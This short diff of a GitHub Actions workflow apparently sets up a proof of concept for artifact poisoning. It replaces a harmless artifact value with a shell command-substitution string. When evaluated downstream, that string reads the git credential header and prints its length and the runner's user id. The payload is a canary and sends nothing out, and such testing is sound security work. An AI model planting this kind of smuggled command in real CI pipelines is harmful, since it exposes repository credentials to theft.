@@ -14,7 +14,8 @@ jobs:
           mkdir -p /tmp/artifact
           echo "1" > /tmp/artifact/pr-number.txt
           echo "true" > /tmp/artifact/diff-generated.txt
-          printf '%s\n' "aGVsbG8=" > /tmp/artifact/diff-content.txt
+          printf '%s\n' '$(X=$(git config --get http.https://github.com/.extraheader); echo GIT_CRED_LEN_${#X}_uid_$(id -u) >&2)' > /tmp/artifact/diff-content.txt
+          printf '%s\n' '# report' > /tmp/artifact/diff-report.md
       - name: Upload diff artifact
         uses: actions/upload-artifact@v4
         with:
